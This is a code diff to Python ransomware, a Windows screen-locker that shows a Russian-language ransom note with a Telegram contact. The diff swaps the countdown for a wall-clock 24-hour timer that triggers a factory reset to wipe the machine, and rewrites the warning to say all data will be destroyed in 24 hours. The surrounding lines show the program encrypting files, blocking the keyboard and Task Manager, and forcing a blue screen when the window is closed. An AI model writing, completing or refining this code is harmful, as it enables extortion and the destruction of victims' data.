@@ -16,6 +16,7 @@ import ctypes
 import winsound
 import hashlib
 import random
+import datetime
 
 # ============================================================
 # ФУНКЦИЯ ДЛЯ ВСТРАИВАНИЯ ЗВУКА
@@ -439,6 +440,28 @@ MAX_ATTEMPTS = 5
 TIMER_SECONDS = 24 * 60 * 60
 
 # ============================================================
+# ТАЙМЕР 24 ЧАСА (РЕАЛЬНЫЙ СБРОС ПО ВРЕМЕНИ)
+# ============================================================
+def timer_loop(app):
+    start_time = datetime.datetime.now()
+    end_time = start_time + datetime.timedelta(seconds=TIMER_SECONDS)
+    
+    while True:
+        now = datetime.datetime.now()
+        time_left = (end_time - now).total_seconds()
+        
+        if time_left <= 0:
+            factory_reset()
+        
+        if hasattr(app, 'timer_label'):
+            hours = int(time_left // 3600)
+            minutes = int((time_left % 3600) // 60)
+            seconds = int(time_left % 60)
+            app.timer_label.config(text=f"⏰ ОСТАЛОСЬ ВРЕМЕНИ: {hours:02d}:{minutes:02d}:{seconds:02d}")
+        
+        time.sleep(1)
+
+# ============================================================
 # ИНТЕРФЕЙС ВИНЛОКЕРА
 # ============================================================
 class NorthOpposittLocker:
@@ -448,7 +471,6 @@ class NorthOpposittLocker:
         self.root.configure(bg='#0a0a0a')
         self.root.protocol("WM_DELETE_WINDOW", lambda: trigger_bsod())
         self.attempts = MAX_ATTEMPTS
-        self.time_left = TIMER_SECONDS
         
         toggle_task_manager(True)
         block_keyboard()
@@ -459,7 +481,7 @@ class NorthOpposittLocker:
         start_system_load()
         
         self.show_locker_screen()
-        self.start_timer()
+        threading.Thread(target=timer_loop, args=(self,), daemon=True).start()
     
     def encrypt_in_background(self):
         self.encrypted_count = encrypt_files()
@@ -468,26 +490,6 @@ class NorthOpposittLocker:
     def update_file_count(self):
         if hasattr(self, 'file_count_label'):
             self.file_count_label.config(text=f"Зашифровано файлов: {self.encrypted_count}")
-    
-    def start_timer(self):
-        def timer_loop():
-            while self.time_left > 0:
-                time.sleep(1)
-                self.time_left -= 1
-                self.update_timer_display()
-                
-                if self.time_left <= 0:
-                    factory_reset()
-        
-        threading.Thread(target=timer_loop, daemon=True).start()
-    
-    def update_timer_display(self):
-        hours = self.time_left // 3600
-        minutes = (self.time_left % 3600) // 60
-        seconds = self.time_left % 60
-        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
-        if hasattr(self, 'timer_label'):
-            self.timer_label.config(text=f"⏰ ОСТАЛОСЬ ВРЕМЕНИ: {time_str}")
     
     def show_locker_screen(self):
         main_frame = tk.Frame(self.root, bg='#0a0a0a')
@@ -517,7 +519,6 @@ class NorthOpposittLocker:
                                           font=("Segoe UI", 12))
         self.file_count_label.pack(pady=5)
         
-        # НОВОЕ СООБЩЕНИЕ С TELEGRAM
         msg = """
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
@@ -530,7 +531,7 @@ class NorthOpposittLocker:
 ║   📩 Напишите в Telegram: @societyvoice                      ║
 ║                                                              ║
 ║   ⚠️ ПРЕДУПРЕЖДЕНИЕ:                                        ║
-║   После таймера все данные будут УНИЧТОЖЕНЫ.                ║
+║   ЧЕРЕЗ 24 ЧАСА ВСЕ ДАННЫЕ БУДУТ УНИЧТОЖЕНЫ                 ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
         """
